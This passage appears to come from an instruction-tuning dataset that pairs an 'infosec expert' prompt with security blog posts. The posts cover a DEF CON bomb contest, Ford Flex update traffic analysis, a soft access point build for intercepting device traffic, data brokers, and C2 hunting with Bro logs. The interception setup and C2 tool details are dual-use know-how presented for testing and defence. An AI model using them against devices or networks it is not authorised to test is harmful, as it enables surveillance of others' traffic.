        "output": "Mike Felch Meet 'The Box Bomb For the last few years at the security conference DEF CON in Las Vegas the Tamper Resistant Village has hosted a challenging contest called 'The Box where contestants mimic an EOD technician in an attempt to defuse a bomb The fake bomb consists of trigger sensors traps electronic components and locks that together need to be reverse engineered in order to disable a simulated explosion Each team of two members has ten minutes to work together to solve each component of the challenge using their own tools and are not allowed to remove tape or cut wires If the bomb explodes they must go to the end of the line Any new teams get to immediately jump to the front For the last few years there were no winners and only hundreds of failed attempts Beau Bullock and I came ready equipped and motivated to break the losing streak We were the only team in three years to defuse the bomb and wanted to share our experience This post should help provide some tips and encourage attendees to give it a shot next year Mike Felch center with his wife Angela Our Strategy We came in with a game plan These strategic moves were the basis for the decisions we executed during our game play Without them we may have had a much different outcome 1 Start Early The contest kicked off Friday morning at 10am and we wanted to get started early It turns out this was a great opportunity to get familiar with the different components of the challenge because of the limited number of new teams 2 Fail Fast In order to progress through and eliminate the endless possible combinations of what could be a portion of the challenge and what wasn't we decided to take the approach of failing fast We learned what not to do very quickly and could focus our efforts on unlocking new key areas 3 Truth Tables When we had a range of possible configurations we leveraged truth tables to eliminate the possibility of overlooking even the finest details For instance the following truth table reflects the 3-switch configuration on the front of the bomb 4 Sharing Knowledge and Tools In the beginning all the teams were very resistant on talking sharing and strategizing together I feel a part of the hesitation was the competitive nature a contest like this creates but I also think for the well-equipped teams we had a sense of security being that we came prepared I strongly believe we helped create a sharing environment early on by lending tools which set the atmosphere for the entire conference The camaraderie led to everyone depending on each other contributing to each others gains and strategizing together We even swapped teammates with The Giner Diner for a round of cross-training on a portion of the challenge that we had already solved consistently Preparation Because this contest is relatively new in comparison to most of the historic contests at DEF CON there wasn't a lot we could do to prepare for what we were about to encounter Last year I spent about 20 minutes watching contestants try to defuse the bomb but I avoided competing because I don't like participating in competitions unless I am all in There are also two videos on YouTube from DEF CON 22 that were helpful in making sure we brought some essential tools ww.youtube.com watch?v sEcVAcTfuVI ww.youtube.com watch?v jEabTPOXh04 Overall preparation really just consisted of thinking through the type of sensors that could have been leveraged and try to find random tools to aid in bypasses Tools of the Trade When determining the tools we should bring we tried focusing on ways in which we could measure the environment to learn new information or influence a change in the environment to control an outcome In other words tape and magnets would help us control moving components whereas a USB endoscope would give us leverage in hard to see areas By thinking through made-up scenarios and incorporating fictional sensors we were able to consider tools or resources that would not have been previously considered This proved to be a double-edged sword since upon arriving at the contest they mentioned the bomb could be defeated with less than five dollars worth of tools and all of which could be obtained at the conference In the image below you can see the tools we ended up using to defeat the challenge The only tools not present in the image is a pick-up tool and a neodymium magnet Looking back we really only needed a magnet piece of cardboard a room key card tape and something to pick a lock with like a small screwdriver Obviously hindsight is 20 20 The Bomb Upon arriving at the contest and being the first team to go we inspected the external environment of the bomb and it quickly became obvious there were numerous directions we could go This escalated once we actually opened the 'Bomb Cover of the yellow case and found lots of lights knobs fuses gauges a wire with many different plugs a sensor and an 'Internal Panel My personal biggest regret is not taking more pictures Attached to the front of the cart on the right was a gray metal 'Switch Panel with three switches in the off position and what at first glance looked to be a light of some sort that was off On the bottom left corner attached to the cart was a 'Circuit Breaker in the 'On position At the very bottom shelf of the cart were two canisters one 'Large Canister with a round metal turn-lid that could be opened and a small canister that seemed to be closed and taped off On the back-side of the cart was a small gray 'Lock-box with a 4-digit combination lock and a key lock below it Finally on the very top of the cart to the left of the yellow case was a timer box and a metal locked box both of which were said to be off limits and not a part of the challenge You probably noticed there were a few items above in bold We will look at each of those a little more in-depth because they contained challenges that would lead to the pressure sensors requiring activation in order to solve the overall challenge Challenge The Bomb Cover The yellow case was super interesting once opened but before we were inside we had to bypass a magnetic sensor on the inside corner of the case Each side of the case was held by a locking hinge that when unlocked provided the ability for someone to pry off the lid through wedging a flathead screwdriver at the seam Luckily another team brought some magnetic film that revealed a darkened field right where the sensor was With some painters tape we attached a magnet over the outside of the case directly over the sensor in order to keep the trigger in the armed position Success Aside from not being too rough when unlatching the hinges and taking off the lid the first challenge was defeated Looking inside at all the moving components and not understanding the context or purpose opened up lots of potential directions Most of the inside was a trap and would lead to instant explosion The main parts we needed to focus on were the five different colored lights in the center starter relay ignition fuel load the sensor in the bottom middle and the 'Internal Panel at the top Obviously we spent a lot of time trying to make sense of everything we were looking at and even started reverse engineering the continuity between the different plugs and the red wire One thing we did learn from opening the lid was that by constantly touching the sensor one of the lights would remain illuminated the moment we quit touching the sensor the light would go out It only seemed to work when we touched it with our fingers which led everyone to believe they were capacitive touch This created a theory that we would be looking for five similar sensors that could be activated to illuminate all five lights After wasting time removing and swapping fuses and brute forcing plug configurations with the red wire I had a feeling we were trying to complete a circuit With the new found knowledge of sensor activated lights and confusion with how we were going to activate five capacitive touch sensors with only four hands we started researching Beau found awesome documentation on the actual panel and I focused on how capacitive touch worked After reading white-papers stackoverflow and blogs It turns out you can create a simulated capacitive signal by using aluminum foil copper wire and a ground I cut an aluminum can and using wired alligator clips to connect the foil to a ground from a battery I tested the device on two cell-phones simultaneously and it worked flawlessly Unfortunately we learned Saturday afternoon that they were actually pressure sensors and not capacitive touch sensors when the capacitive generator wouldn't keep the light illuminated leading to another team trying pressure instead Thanks Tom Challenge The Internal Panel At the top of the yellow box resided a latched panel covering a compartment that was guarded by a spring-loaded trigger This one was a little tricky and required a thin sturdy piece of 4x1 inch cardboard that could be used as a shim to slide in the opening of the panel while maintaining the trigger in the armed position Once fully opened we taped the cardboard in place so we could move on Within the compartment was another pressure sensor that activated a different light Wedging the cardboard was a little tricky at first because one of the orange fuses had some sort of touch sensor that had to be avoided Nonetheless we had another success Challenge The Switch Panel As seen in the bottom right corner of the picture below a gray metal panel containing three switches can be seen as soon as the contestants walk up to the bomb Obviously instinct says to throw each switch to see what happens We quickly learned that the third switch would trigger the bomb every time and no matter what state the other two switches were in To make matters worse inside the box was some sort of light sensor that trigger the moment you shined a flashlight into it This panel and the electrical switches were a trap No interaction was needed to defuse the bomb it only created a quick death for most new teams who decided to learn for themselves Overall I am glad it was a part of the contest because it made the line shorter fairly quickly Challenge The Circuit Breaker Also in the above image you will notice a circuit breaker in the bottom left of the picture You would be surprised how many teams threw the breaker I believe we were the first team to throw it into the off position in an attempt to accept or reject it as a necessary move It was predicted to blow the bomb but we just wanted to verify our theory You will notice a small hole directly below the red lever Using a small screwdriver you could lift the inside locking mechanism to open the door to the actual breaker Inside there were three large fuses which evidently didn't need to be removed We didn't have to burn any rounds figuring that one out because other teams spent a lot of time testing each one of the internal fuses After opening the door and looking around we found another pressure sensor attached to the back wall behind the fuses Upon putting pressure on it we were able to identify another light being illuminated Three down two to go Challenge The Large Canister Saturday morning we decided to immediately focus on the large canister since we learned on Friday it could actually be opened We knew the cart was very sensitive and that even a small bump would trigger an explosion We watched another team Friday hold the canister very still while slowly turning the lid and so we followed suit successfully After opening the lid and seeing a 20oz bottle sitting sideways in some sort of fixture we used a USB endoscope and cell phone to view the inside Beau watched the recording in slow-motion and found another sensor We decided to try and pull out the 20oz bottle all the way which revealed the sensor on the bottom right It turns out the bottle had wires on the back attached to some sort of liquid-level trigger sensor that when tilted would trigger an explosion Most of the other teams lifted the cart towards the canister and placed the wheels on small cardboard boxes but I wasn't convinced it was needed After all we were already successful at removing the bottle without elevating the cart Side note Saturday just before the end of the day another team accidentally pulled the bottle out too far breaking the tilt sensor which indirectly created a misunderstanding of how the sensor actually worked After the contest closed for the day the hosts fixed the sensor and Sunday morning all the teams were exploding because they were trying to tilt the liquid forward in the same manner that proved to be successful the day before With the sensor fixed any tilting would create an explosion I couldn't get my hand inside the rim of the canister without getting cut but luckily I was able to borrow the pickup-tool from another competitor named 'Tom which happened to apply just enough pressure sideways to activate the light hands free Four down with one left Challenge The Lock-Box This challenge create problems for everyone in the beginning Luckily Beau and I were able to solve this one consistently and fairly quickly Using a quarter we opened the bottom key lock and didn't waste any time with the combination lock which proved to be a good move because it was a useless tarpit With a room key we shimmed through the corner and up to the top where we identified the spring-loaded sensor was armed Once taping the room key in place we slowly opened the door but too much immediately triggered a light sensor Looking inside the box we found the fifth sensor on the back panel and by holding taping the door partially opened we had just enough space to fit a hand in to touch the sensor and illuminate the final fifth light We ended up using a black shirt to cover the box just in case light entered while holding the door The Final Run Saturday afternoon quickly came and Beau had to leave for his flight By this time we had already identified all five sensors practically mastered each challenge and were working to simultaneously activate all of them at the same time in hopes of defusing the bomb With Beau gone and requiring teams of two I convinced my wife Angela to join me She is super competitive very organized and had already successfully completed an escape room with me previously I knew she was the right person for the job We had the opportunity for about three runs on Saturday after Beau left and before the contest closed for the day so I leveraged them to quickly train her on all of the challenges Sunday morning we arrived late and the crowd was pretty big About the third attempt Sunday morning we activated all five sensors at the same time and defused the bomb to a roaring crowd some of which spent most the entire conference watching Overall it was an absolute great experience and worth the investment Below is what the bomb looked like seconds after our victory I'm glad I captured this picture Final Thoughts 1 Sharing tools with new teams greatly hurts game play There were times we waited over an hour to play because so many new teams would see how we were solving the challenges would decide to play and then would ask to borrow our tools Keeping track of who has your equipment while keeping it in a usable form is tiring especially having to wait so long to try again Next time we will probably decide to only share tools with teams who are taking the challenge seriously 2 Trust nothing and verify everything I burned research time on capacitive touch because I didn't verify my theory before testing with pressure only While that is common sense it can be difficult to remember when you are in the spur of the moment We also witnessed other teams committed to a theory without proving why they decided to pursue the direction 3 Pick a name before you get there If you don't the hosts will pick one for you and you will regret it 4 Can we get a formalized line next year Please The only recommendation I have for increasing the quality of game play is to formalize the line It's hard to keep track of your tools who goes next who's in front of you and whether the people standing around are players or spectators I put together a quick image to reflect what might have made a huge impact for everyone involved A one way in one way out line for teams while still giving them the ability to watch progress during their wait Since the chairs were used to hold up the barrier it would be an excellent opportunity for each team to sit for a few minutes in between turns Special Thanks The Giner Diner It was a huge pleasure competing with you strategizing and learning from each other We wouldn't have made it as far as we did if it weren't for you two If you read this feel free to connect with us on Twitter See you next year The Mysterious Tom Thanks a bunch for letting us borrow the pickup-tool It was great to meet you even though we were a little intimidated when you and your teammate walked in with all those crazy tools For a second I thought you might be a real EOD technician Datagram and The MFP's We appreciate you taking the time to put together an awesome contest and fun challenge While we were a little disappointed that The Dark Tangent didn't select the contest for a black badge the experience we had outweighed it Keep up the great work If you need help with the bomb for next year we have some great ideas"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Internet of Things Exploration: 2016 Ford Flex</title>\n<taxonomies>Author, David Fletcher, InfoSec 201, 2016 Ford Flex, Internet of Things, IoT, updates, wi-fi</taxonomies>\n<creation_date>Thu, 31 Aug 2017 13:43:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher My wife and I recently purchased a 2016 Ford Flex to replace an aging version of the same make and model that met an untimely fate During the feature walk-through the salesperson identified how convenient this version of the Sync platform was because you could update the firmware on the infotainment unit over WiFi As soon as the words were spoken my wife turned to me and said Don't get any ideas However she knew that there would be no stopping me from at least analyzing the update process When we got the car home I created a software access point as described in the blog post found here Then I began to explore security features involved in the update process itself Inspecting the features of the vehicle I found that each of the exposed interfaces could be disabled using the touch screen interface This included disabling Wi-Fi Bluetooth and Automatic Update of the vehicle firmware Screen captures of each can be seen below For the purposes of testing I enabled both the Wi-Fi and Automatic Update features so I could observe and inspect the process In order to attempt an update I needed to connect the car to my software access point The first thing that I noticed was that the car allowed me to connect to ANY wireless network without complaint My software access point was configured explicitly to have no security to see if the car would at least warn me that this was a bad idea As seen below the car happily connected to the wireless network I had provided that completely lacked authentication and encryption Mind you the only identified purpose for the Wi-Fi interface is for over the air update of the infotainment unit First you see the Wi-Fi Network selector The only indicator that the network is not secure is the open lock Selecting the network presents the dialog below which allows the operator to connect or view the details for the network No warning about security of the network is presented to make the user think twice Keep in mind that updating the vehicle is the ONLY purpose for Wi-Fi connectivity Reviewing the network details presents the following dialog that plainly identifies that no security is available on the network No warning to the operator is presented here either After clicking connect the following success message is returned Still no warning about security Finally the Owner's Manual for the vehicle was consulted and also found to lack any kind of warning when describing the feature to the operator of the vehicle Excerpts from the Sync 3 supplement that is delivered with the vehicle can be seen below Back on my software access point I observed the car connect to my SSID and obtain a DHCP lease Prior to connecting the vehicle to the internet I started tcpdump to capture any communication produced by the vehicle In fact I completed the connection process several times over a wide range of dates so I could capture several update cycles After capturing each update cycle I analyzed the update process using the Wireshark protocol analyzer Upon initially connecting to the wireless network there was a flurry of activity including expected DHCP requests over IPv4 and IPv6 However there was also unexpected behavior like ARP requests to check for AutoConfigure IP address availability and the presence of Multicast DNS requests from the vehicle After several minutes of this traffic pattern repeating the vehicle finally initiated the update cycle First the update host was resolved using DNS and then a connection to the update server was initiated...over plain text HTTP The FQDN for the update server was observed to be ivsu.software.ford.com which resulted in multiple CNAME lookups and finally resolved to the IP address 191.236.55.220 as seen below It should be noted that at no point did I directly interact with these servers I simply recorded the interaction that my vehicle performed using Wireshark Reassembly of the HTTP update request transaction resulted in display of a large JSON POST request followed by a similar response from the server The embedded data in both the request and response had the distinct appearance of Base64 encoded data The request was first passed to the linux base64 utility and decoded to reveal a large embedded XML document which included my vehicle's VIN and information regarding embedded components including serial numbers ECU addresses and MAC addresses At the end of the request message was another embedded base64 encoded value labeled SyncData Decode of this value revealed that the embedded data included both binary and string information Passing this output to the linux strings utility resulted in the following output Within the string output was an email address for Ford Motor Company and a string indicating that the embedded XML payload was encrypted After analyzing the request I moved to analyze the response message Using the same techniques the response was found to contain data similar to the request with the exception of the encrypted base64 encoded value Review of the decoded response revealed a list of fields that appeared to match those included in the request The information included in the response was the specification describing the field formats and lengths in the request message During one of my ensuing analysis sessions I was actually able to catch the vehicle downloading an update Updates were retrieved from the server over clear text HTTP as seen below In addition I downloaded both of the update files for follow-on analysis However that will have to wait for another post To recap the vehicle didn't pass what could be considered operator sensitive information to the server unencrypted However it did include information about the components included in the vehicle In addition anyone with Man-in-the-Middle position between the vehicle and update server can identify the vehicle's update location by geolocating the IP address Some best practices that were violated The vehicle connected to open WiFi without warning the operator The operator's manual didn't include any language warning about use of open WiFi An mDNS daemon is running on the vehicle and interrogating services on the connected network Communication between the vehicle and server was accomplished over clear text HTTP No authentication scheme was in place to restrict access to update content Transaction data was obfuscated using base64 encoding Until the next post In the meantime I'm very happy about my vehicle However I'll be leaving WiFi and Automatic Updates off for the time being"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Build a Soft Access Point in Ubuntu 16.04</title>\n<taxonomies>Author, David Fletcher, How-To, InfoSec 301, AP, Soft Access Point, software access point, Ubuntu, Ubuntu 16.04</taxonomies>\n<creation_date>Mon, 28 Aug 2017 14:32:23 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher This blog post is going to illustrate setting up a software access point AP on Ubuntu 16.04 Having the ability to create a software AP can be very handy in testing devices with 802.11 wireless capabilities By using the software AP we can observe all traffic being generated by a device inspect that traffic and determine methods to attack the device It should be noted that there are many other ways to accomplish the goal of traffic inspection such as An access point with built-in diagnostic tools or packet capture capabilities Open source device firmware packages Access point software like hostapd An interception proxy such as Burp Suite or OWASP ZAP ARP cache poisoning attacks Devices like the WiFi Pineapple However by using a full fledged general purpose operating system we gain the advantage of wide support for tools that we might wish to run against the target system As a result we're relieved of issues that arise due to cross-compilation or platform tool support I typically create my software AP as a virtual machine and take advantage of pass-through USB support using an external wireless adapter This way I don't have to have support in my native operating system and can start an AP with minimal configuration My favorite wireless adapter to use in this situation is the ALFA AWUS051NH high gain 802.11 a b g n adapter seen below Starting with a freshly installed Ubuntu 16.04 fully patched we need to satisfy a few prerequisites for our software access point These include The Aircrack-NG Suite The Airbase-NG component of this tool suite will be used to emulate the actual wireless access point itself The bridge utilities package This component will allow us to bridge the interface that our access point is running on to an internet-connected interface It will also allow us to observe and record activity across the bridge interface The wireless tools package This package contains the iwconfig utility which can be used to inspect and alter the configuration of your wireless adapter The rfkill utility This utility will allow us free up the wireless adapter from control by the host operating system so we can use it to support our AP ISC DHCP Server This package will provide DHCP support for our AP so connecting clients get proper IP address and DNS settings These prerequisites can be installed by running the following command as root sudo apt-get install aircrack-ng bridge-utils wireless-tools rfkill isc-dhcp-server Note It is a good idea to run the following before installing the above packages to ensure that your system is completely up to date sudo apt-get update sudo apt-get upgrade sudo apt-get dist-upgrade With the prerequisites out of the way we can begin to configure our software AP First connect the wireless adapter to the host and ensure that the adapter is recognized by the operating system Use the iwconfig and ifconfig commands to ensure that the newly connected adapter appears in the interface list as seen below Next we need to prevent the host operating system from using this interface in managed mode To do so we will issue the commands nmcli radio wifi off and rfkill unblock all The first command disabled management of the wifi radio by the host operating system network manager The second removes software blocks that the operating system has placed on wireless devices With the wireless adapter free for use we can now start broadcasting our SSID using Airbase-NG as seen below This command takes the SSID that we wish to advertise and the adapter that will host it This access point is just used as a quick security testing capability and does not encrypt traffic If encryption using WPA2 is desired the hostapd package should be considered as an alternative At this point we can connect a client to the SSID but it won't be able to obtain an IP address or surf the internet This is where the bridge utilities package comes into play As seen above airbase-ng creates an interface at0 We will create a bridge named br0 and add the at0 interface to the bridge Then we will bring both interfaces up and assign an IP address to the bridge interface The bridge interface br0 now has the IP address of our default gateway assigned and shares an Ethernet segment with at0 However a connecting client still won't get an IP address or be able to communicate with the internet The next step is to configure our DHCP server to provide an IP address default gateway and name server information to connecting clients This will be accomplished using the ISC DHCP server that we installed during initial configuration of our system For the purposes of this demonstration we've made a copy of etc dhcp dhcpd.conf in root's home directory to experiment with Using the configuration file seen below we've specified name servers 8.8.8.8 the subnet we will be servicing 192.168.100.0 24 the range of IP addresses in our scope 192.168.100.10-99 and our default gateway 192.168.100.1 Next we need to start the DHCP server However since we're running the DHCP instance interactively as root we need to take ownership of the dhcp.leases file otherwise we will receive an error when we attempt to start the server This change is not permanent After each reboot ownership will revert so this must be reaccomplished each time you restart the operating system running your AP After altering ownership of the leases file we can start the DHCP server on our bridge interface using the configuration file we just created If the server starts successfully you'll see output similar to what appears below Now our clients can connect to the software AP and will get appropriate IP information from our DHCP server However they still won't be able to communicate to the internet The final step in getting our AP up and running is to to enable IP forwarding and to insert a rule into the iptables firewall to forward and NAT traffic with a source address in the range of our wireless segment This tells the linux kernel to enable IP forwarding and use its routing table to deliver traffic Then it NATs the outbound traffic with source addresses matching our wireless segment using the address bound to our Ethernet adapter With all of this in place we should be able to observe associations lease establishment and monitor traffic as seen below Having this capability will allow us to observe behavior when connecting to an open AP think less about standard operating systems and more about IOT devices and analyze traffic being passed between the client and backend infrastructure As always be aware of any sensitive data being passed back and forth and seek a more secure alternative if necessary As identified above there are many alternatives to this technique"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Review of the Data Brokers</title>\n<taxonomies>Author, InfoSec 201, Jordan Drysdale, data, Data Brokers, Digital Identity, privacy</taxonomies>\n<creation_date>Tue, 05 Sep 2017 15:26:06 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale The following content is loosely based on a presentation I gave at BSides Denver After speaking at BSides Denver one of the audience members spent some time discussing the content with BHIS He called the software he helped this particular data broker build The Actual Privacy Death Star His claim was that approximately 1400 unique data points were collected on a per-human basis and were then used to target ads The most profitable of the targeted ads he claimed were delivered under certain 'manic conditions His point was that when people were searching things like opioid abuse suicide hotlines et cetera the targeted ads delivered in these search results were among the most profitable for the data brokers Article re 2014 ww.ftc.gov news-events press-releases 2014 05 ftc-recommends-congress-require-data-broker-industry-be-more?utm_source govdelivery Eradicate The data brokers know more than Google Facebook or any other single entity that gathers human specific trackable info They are aggregators their relationships with search engine marketeers allow them a constant pipeline of updated human intel Location services on our devices integrate with our online personas and are pipelined outbound direct to our individual death star database tables These are all on by default and are re-enabled by updates Digital Identity Crisis Recover Alternate identities burner phones VMs bitcoin private browsing plugins pi-hole project .uggh Privacy Badger AdBlock Plus still keeps track of every single site we visit Panopticlick uBlockOrigin Meow Funnels of data collection Transit Operating System Microsoft's OS 10 the new primary data collector for M Dgr.com 2016 01 05 microsoft-windows-10-spying-2015-user-data Browser Amazon purchases Every search string ever Mobile Super cookie and Verizon's privacy fun times Add something to cart on mobile should arrive on your desktop's cart shortly Cookies Super cookie perma cookie cookie monster Life Divorce filings Criminal Proceedings Deaths Possible associates Nom nom nom SANS 504 and its principles have become a part of daily life PICERL It is fair to assume at this point that we're all compromised So since there's been an incident and we've definitely been compromised what do we do How do we even contain a breach of this magnitude These folks will sell you everything you want to know about anyone presuming you aren't trying to hire them or lease them something We really need to take a step back and first recognize that this is a problem a real big problem Meet the data brokers Acxiom Corelogic Datalogix eBureau ID Analytics Intelius PeekYou Rapleaf Recorded Future Companies are monetizing us Astute observers of the Security Weekly podcasts may remember Joff asking why doesn't someone figure out and start the process of claiming a portion of the money ad networks are making of us Sure we are currently being grouped and pooled and statistics are being run against our demographic interests but regardless our individual habits are being monetized Do we just need to sue via tort How do we define and assess damage in this situation These activations recently went through the incinerator These questions don't really have answers and I am definitely not advocating more lawsuits What I am advocating is an awareness of a serious problem So where are we in the 504 ethos It is hard to contain the losses since they have populated data arrays around the globe already Eradication of this righteous infliction may have to begin where a lot of breached companies do forensic analysis of the losses recovery and learning from the incident Privacy trainwreck If we were going to start over at the beginning with a clean slate what would I do differently Prepare Amazon is one of best aggregators of data bad and their cloud platform is awesome good Spin an AWS CloudFormation instance of IAD Gov's GoSecure Use the blog post here and the GitHub here to set up your OSI layer 1 through 4 cloaking device on a raspberry pi GoSecure Magic Identify I am going with threats here and presumably because of what we've learned transit isn't all that interesting to data brokers One of our blue teamers built a powershell script that does nothing except generate white noise Every five minutes a new random URL is visited from a tiny VM full of ad garbage and all the fun of browsing the internet insecurely For daily life Private browsing mode and the array of plugins it takes to make one's browser configuration unique at Panopticlick will help you stay semi-anonymous This crew will trade you Starbucks cards for log-free VPN access 10 bucks at Starbucks or 37 days of PrivateInternetAccess I'll have a latte por favor Contain This is where a conversation John and I had comes back into focus As civilians we should operating at Defcon 3 under the full assumption that we are being individually tracked monitored and every conversation we have filtered for interesting tidbits Our operational level should be to carry the RPi with us everywhere search with DuckDuckGo and support the EFF Non-Attrib Paypal takes gift cards The less you contribute Apps EULA's Location Data The better Use DuckDuckGo PrivateInternetAccess Check out and cleanse your google history We are stopping here since we are back where we began There's been an incident We've been compromised"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Let's Go Hunting! How to Hunt Command & Control Channels Using Bro IDS and RITA</title>\n<taxonomies>Blue Team, Hunt Teaming, Bro IDS, dnscat2, How to, meterpreter, PowerShell Empire, RITA</taxonomies>\n<creation_date>Wed, 13 Sep 2017 14:55:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Logan Lembke Here at BHIS we Bro IDS Imagine Bro IDS Everywhere If you haven't encountered Bro IDS before checkout this webcast on John's Youtube channel discussing the need for Bro IDS and what it can offer your local blue team Readying Your Weapons Installing Bro IDS Bro IDS requires a UNIX like operating system such as Linux Mac OS or BSD Bro installations are generally tailored to their environment As such there are several ways to get started with Bro The official installation instructions suggest compiling Bro from source While this approach will provide you with extra goodies a packaged binary will do just fine for offline packet capture analysis In order to install a packaged version of Bro IDS Visit ww.bro.org download packages.html Find and run the instructions for your operating system Install the bro-aux package as well Add opt bro bin to your PATH Alternatively I've put together an installation script for Debian based systems which will compile Bro IDS from source with all of its optional dependencies Understanding the Tracks We'll Even Catch the Ninja Bro IDS may be used to directly analyze a tapped network however Bro is also able to analyze raw pcap files Included below are three sample packet captures Each capture contains the traffic produced by an infected machine 10.200.201.29 communicating back to an attack server Before continuing download the following files Dnscat2 Command and control using DNS queries Powershell Empire Command and control using HTTPS connections Meterpreter Command and control using TCP connections After downloading each of the individual packet captures open up a terminal and move each file into its own directory Bro IDS writes its analysis results out to the current working directory and we don't want to confuse the results from the different packet captures Finally extract each file with gunzip sample.pcap.gz Running find from the top level directory should yield something similar to this Once the files are in their individual folders we need to run Bro In each of the individual folders run bro -C -r sample.pcap local Site local_nets 10.0.0.0 8 This will produce a number of logs in each directory The700 -C flag tells Bro to ignore the packet checksums the -r flag tells Bro to read a pcap file and the rest lets Bro know that the 10.x.x.x 8 subnet is our local network In a real-world scenario Bro produces an extraordinarily large amount of data to sift through While the official documentation is actively maintained it is spread across multiple web pages Alternatively Critical Stack has put together a helpful handout explaining each of the logs Easy Game Dnscat2 DNS Tunneling C2 The Original DNSCat Logo Isn't He Cute Dnscat2 has been mentioned a couple of times before on the BHIS blog We showed that the tool could bypass Cylance and Luke presented his rewrite of the tool using Powershell If you're unfamiliar with dnscat2 I encourage you to take a look at our earlier posts before continuing Conn.log The connection log is the most important Bro log to review Per the Bro IDS website The connection log manages the tracking logging of general information regarding TCP UDP and ICMP traffic For UDP and ICMP connections are to be interpreted using flow semantics sequence of packets from a source host port to a destination host port These flow semantics catch dnscat2 red-handed Normally when looking at a packet capture UDP traffic is seen as a stream of individual datagrams sent across the network However Bro IDS groups these connections together as long as they happen at a reasonable rate over a unique socket pair This means Bro IDS can easily point out long UDP sessions In the conn.log produced by analyzing dnscat2.pcap you should see the following line 1503528301.909886 CoPfoo4LI4g4NNUFOe 10.200.201.29 33733 10.200.201.2 53 udp dns 2467.745404 402129 639484 SF T T 0 Dd 4837 537565 4837 774920 empty This line shows that our infected host 10.200.201.29 issued thousands of consecutive DNS queries over the period of 2 467.7 minutes 41 hours Any long-running connections should be immediately suspect especially if they happen to be running over DNS Dns.log The DNS log is one of the most helpful logs for identifying user behavior While most traffic is secured by TLS and hidden from analysis we can still find out which sites our individual hosts have connected to via their DNS lookups The DNS log produced by the Dnscat2 is especially gnarly I recommend using less -S dns.log in order to view the file The -S option prevents word wrapping Upon opening the file you will notice that all of the requests share a common super domain sirknightthe.chickenkiller.com My command and control server is the authoritative name server for this domain As such any dns queries for a subdomain of sirknightthe.chickenkiller.com will be sent to it The final subdomains are generated by the dnscat2 client in order to send data back to the C2 server Since the dnscat2 client needs to encode all of its data in these subdomains it needs to produce a large number of them In order to catch this DNS tunneling behavior we need to keep a count of the subdomains we have seen for a given super domain After gathering this data we look for abnormally high ranking counts However there may be another way to catch Dnscat2 By default the Dnscat2 client sends out MX CNAME and TXT record queries While CNAME queries will appear in almost every network environment MX and TXT queries are somewhat rare An abnormal influx of MX CNAME or TXT records may indicate that a dns tunnel is operating on your network Upping the Difficulty Powershell Empire Reverse HTTPS C2 Powershell Empire is one of the most used post-exploitation tool kits available In the sample linked above a python based implant was ran on a Linux machine This infected machine then called back to a Powershell Empire C2 server over HTTPS Conn.log Unfortunately Powershell Empire doesn't keep a single TCP session alive so we can't use the same long connection analysis we used earlier for dnscat2 Rather it beacons After you open the connection log produced by the Powershell Empire capture look at the recorded timestamps If you look closely you will see that the implant called back to the C2 server every 5 seconds Using frequency analysis we can clearly spot this beaconing behavior Alternatively we can simply look for hosts which have made a large number of connections to a single external host over the course of a day Unfortunately this beaconing behavior is not so readily apparent in real-world packet captures Connections from other systems clutter up the connection log and it is difficult to check the timestamps directly Beyond the needle in the haystack problem jitter may be introduced to the connection Jitter randomly adds delays between the beacons throwing off the every 5 seconds relation we had noticed before However advanced frequency analyses have been shown to detect beaconing behavior even in the presence of jitter Alternatively look at the fields labeled orig_bytes and resp_bytes These are extremely regular These fields measure how many bytes were sent to and from our infected host over each TCP connection Unfortunately these fields may slightly vary over the course of the infection As a hacker pivots or exfiltrates data from a system more or less data may be sent Ssl.log While SSL and TLS secure most of our data Bro IDS is able to get around this by harvesting unencrypted connection metadata and logging it to the SSL log In this capture almost every connection was made over TLS You can prove this to yourself by comparing the connection and SSL logs In fact you can relate the log entries using their second field uid Bro analyzes each connection in several different ways and uses these UIDs to relate the analysis results In the SSL log we see the same beaconing behavior however we see something more interesting Each connection was encrypted with a self-signed certificate By default most hacking tools use self-signed certificates This makes it easy to catch lazy hackers If you're interested in learning more about the certificates used for each connection look at the corresponding entries in the x509 and files logs Seeing Through the Camouflage Meterpreter Reverse TCP C2 Even Camo is Digital Now A Meterpreter connection can be established using either a reverse TCP transport or a reverse HTTP S transport meaning Meterpreter has a few different ways to call back home The HTTPS transport is similar to that of Powershell Empire However the TCP transport maintains an active TCP connection throughout the infection In this capture I elected to use the reverse TCP transport I've purposefully left the Meterpreter packet capture dirty in 